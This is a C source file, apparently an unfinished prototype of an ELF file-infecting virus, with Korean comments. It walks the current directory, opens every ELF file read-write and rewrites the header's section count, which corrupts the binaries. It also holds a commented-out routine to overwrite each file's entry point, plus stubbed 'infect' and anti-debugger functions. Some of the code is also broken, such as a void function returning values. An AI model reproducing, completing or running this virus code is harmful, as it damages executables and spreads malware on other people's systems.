#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)


typedef struct temp_Elf64_Shdr{
  Elf64_Word    sh_name;                /* Section name (string tbl index) */
  Elf64_Word    sh_type;                /* Section type */
  Elf64_Xword   sh_flags;               /* Section flags */
  Elf64_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf64_Off     sh_offset;              /* Section file offset */
  Elf64_Xword   sh_size;                /* Section size in bytes */
  Elf64_Word    sh_link;                /* Link to another section */
  Elf64_Word    sh_info;                /* Additional section information */
  Elf64_Xword   sh_addralign;           /* Section alignment */
  Elf64_Xword   sh_entsize;             /* Entry size if section holds table */
} temp_Elf64_Shdr;//Elf64_Shdr;

typedef struct temp_Elf64_Phdr{
  Elf64_Word    p_type;                 /* Segment type */
  Elf64_Word    p_flags;                /* Segment flags */
  Elf64_Off     p_offset;               /* Segment file offset */
  Elf64_Addr    p_vaddr;                /* Segment virtual address */
  Elf64_Addr    p_paddr;                /* Segment physical address */
  Elf64_Xword   p_filesz;               /* Segment size in file */
  Elf64_Xword   p_memsz;                /* Segment size in memory */
  Elf64_Xword   p_align;                /* Segment alignment */
} temp_Elf64_Phdr;//Elf64_Phdr;

typedef struct temp_Elf64_Ehdr{
  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
  Elf64_Half    e_type;                 /* Object file type */
  Elf64_Half    e_machine;              /* Architecture */
  Elf64_Word    e_version;              /* Object file version */
  Elf64_Addr    e_entry;                /* Entry point virtual address */
  Elf64_Off     e_phoff;                /* Program header table file offset */
  Elf64_Off     e_shoff;                /* Section header table file offset */
  Elf64_Word    e_flags;                /* Processor-specific flags */
  Elf64_Half    e_ehsize;               /* ELF header size in bytes */
  Elf64_Half    e_phentsize;            /* Program header table entry size */
  Elf64_Half    e_phnum;                /* Program header table entry count */
  Elf64_Half    e_shentsize;            /* Section header table entry size */
  Elf64_Half    e_shnum;                /* Section header table entry count */
  Elf64_Half    e_shstrndx;             /* Section header string table index */
} temp_Elf64_Ehdr;//Elf64_Ehdr;

void infect(const char* fpath){
    printf("%s will be infected.\n", fpath);
}

int activate(){
    return 1; // 
}

void change_entrypoint(const char* fpath, char *newaddr){
	int fd;
	int i;
	Elf64_Shdr *shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	int plen, slen;
	unsigned long b = brk(0), k, sdata, pdata;
	
	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
		printf("[ERROR] Permission error(%s)\n",fpath);
		return 0;
		//exit(1);
	}
	if(!activate()){
		printf("[ERROR] Debugger detected(%s)\n",fpath);
		return 0;
		//exit(1);
	}
	fd = open(fpath, O_RDWR); //자기자신을 open할경우 여기서 fail나서 따로신경써줄필요ㄴㄴ
	if (fd < 0){
		printf("[ERROR] fd error(%s)\n",fpath);
		return 0;
		//exit(1); 
	}
	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
		printf("[ERROR] ehdr read error(%s)\n",fpath);
		return 0;
		//exit(1); 
	}
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ //elf가 아니라면
		printf("[ERROR] not ELF!(%s) \n",fpath);
		return 0;
		//exit(1);
	}
	
	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
	// 여러개의 phdr정보들을 읽기
	lseek(fd, ehdr.e_phoff, SEEK_SET); // e_phoff 만큼 테이프를 돌린다
	for(i=0;i<ehdr.e_phnum;i++){
		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
			printf("[ERROR] phdr read error(%s)\n",fpath);
			return 0;
			//exit(1); 
		}
		else{
			printf("[SUCCESS] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
		}
	}
	
	//1. 프로그램헤더에서 Loadable Segment의 권한을 RWX로 셋팅
	// 프로그램헤더 엔트리사이즈 = ehdr.e_phentsize
	// 프로그램헤더 갯수 = ehdr.e_phnum
	
	
	//1. elf헤더의 엔트리갯수 늘리기
	ehdr.e_shnum = ehdr.e_shnum + 1;
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); 
	printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
	
	//2. 섹션헤더의...가아니라 파일의맨뒤에 가짜 섹션테이블을추가하기
	// Entry point overwriting routine.. Don't touch it!
	/*
	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); //write 실패

	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	*/
	
	

	
	//exit(0);
}

int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
    int ret = 0;
    if (flag == FTW_F && activate()) 
		change_entrypoint(fpath, "0x11111111");
        
    return ret;
}

int main(int argc, char* argv[])
{
    struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);
}



